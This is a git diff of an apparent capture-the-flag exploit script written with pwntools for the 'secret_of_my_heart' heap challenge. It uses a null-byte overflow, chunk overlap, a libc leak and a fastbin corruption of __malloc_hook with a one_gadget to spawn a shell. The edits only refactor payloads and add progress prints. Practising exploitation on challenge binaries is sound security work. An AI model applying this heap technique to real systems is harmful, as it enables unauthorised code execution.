@@ -26,9 +26,9 @@ leak_hex = lambda r, offset=0: int(r, 16) - offset
 leak_dec = lambda r, offset=0: int(r, 10) - offset
 pad = lambda len=1, c=b'A': c * len
 
-exe = ELF("secret_of_my_heart_patched")
-libc = ELF("libc_64.so.6")
-ld = ELF("./ld-2.23.so")
+exe = ELF("secret_of_my_heart_patched", checksec=False)
+libc = ELF("libc_64.so.6", checksec=False)
+ld = ELF("./ld-2.23.so", checksec=False)
 
 context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
@@ -75,20 +75,17 @@ def delete_secret(index):
     slan(p, b'choice', 3)
     slan(p, b'Index', index)
 
-
-'''
-THIS PROGRAM HAS 1 NULL BYTE OVERFLOW
-'''
 create_secret(0x80, b'A', b'A') # 0
 create_secret(0x18, b'A', b'A') # 1
 create_secret(0x100-0x10, b'A', pad(0x48, b'\0') + p64(0xb1)) # 2
 create_secret(0x10, b'A', b'A') # 3
 
+print("Overlapping chunks")
 delete_secret(0)
 delete_secret(1)
 
 # Overflow 1 byte from chunk 0x18 to chunk 0xf0
-create_secret(0x18, b'A', pad(0x10) + p64(0xb0)) # 0
+create_secret(0x18, b'A', flat(pad(0x10), 0xb0)) # 0
 
 # Consolidate 0x80 + 0x18 + 0xf0
 delete_secret(2)
@@ -96,7 +93,7 @@ delete_secret(2)
 # Create so that ptmalloc write libc address to chunk 0x18
 create_secret(0x80, b'A', b'A') # 1
 
-# Then we leak libc
+print("Leaking libc")
 show_secret(0)
 
 ru(p, b'Secret : ')
@@ -105,8 +102,9 @@ lg("libc base", libc.address)
 
 delete_secret(1)
 
+print("Overwriting hooks")
 # Fake size to 0x70 to later overwrite malloc hook
-create_secret(0xa0, b'A', pad(0x88, b'\0') + p64(0x71) + pad(0x10))
+create_secret(0xa0, b'A', flat(pad(0x88, b'\0'), 0x71, pad(0x10)))
 delete_secret(0)
 
 delete_secret(1)
@@ -115,7 +113,7 @@ malloc_hook = libc.symbols['__malloc_hook']
 lg("malloc hook", malloc_hook)
 
 # UAF to mess with fastbin entry
-create_secret(0xa0, b'A', pad(0x88, b'\0') + p64(0x71) + p64(malloc_hook - 0x23))
+create_secret(0xa0, b'A', flat(pad(0x88, b'\0'), 0x71, malloc_hook - 0x23))
 
 '''
 0x4526a execve("/bin/sh", rsp+0x30, environ)
@@ -123,11 +121,16 @@ constraints:
   [rsp+0x30] == NULL
 '''
 one_gadget = libc.address + 0x4526a
+lg("one gadget", one_gadget)
+
+realloc = libc.symbols['realloc']
+lg("realloc", realloc)
 
 create_secret(0x60, b'A', b'A')
 
-create_secret(0x60, b'A', pad(0x13-8) + p64(one_gadget) + p64(libc.symbols['realloc'] + 12))
+create_secret(0x60, b'A', flat(pad(0x13 - 8), one_gadget, realloc + 12))
 
+print("Spawn shell")
 create_secret(0x10, b'A', b'')
-
+rr(p, 1)
 ia(p)
